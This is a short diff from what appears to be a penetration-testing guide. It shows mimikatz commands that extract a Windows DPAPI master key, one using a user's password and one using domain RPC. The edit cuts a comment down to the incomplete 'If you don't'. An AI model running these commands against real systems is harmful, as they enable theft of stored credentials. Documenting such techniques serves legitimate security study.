@@ -117,7 +117,7 @@ For where you can extract the master key with mimikatz:
 <pre class="language-bash"><code class="lang-bash"><strong># If you know the users password
 </strong><strong>dpapi::masterkey /in:"C:\Users\&#x3C;username>\AppData\Roaming\Microsoft\Protect\S-1-5-21-2552734371-813931464-1050690807-1106\3e90dd9e-f901-40a1-b691-84d7f647b8fe" /sid:S-1-5-21-2552734371-813931464-1050690807-1106 /password:123456 /protected
 </strong><strong>
-</strong><strong># If you don't have the users password and inside an AD
+</strong><strong># If you don't
 </strong>dpapi::masterkey /in:"C:\Users\&#x3C;username>\AppData\Roaming\Microsoft\Protect\S-1-5-21-2552734371-813931464-1050690807-1106\3e90dd9e-f901-40a1-b691-84d7f647b8fe" /rpc</code></pre>
 
 The master key of the file will appear in the output.
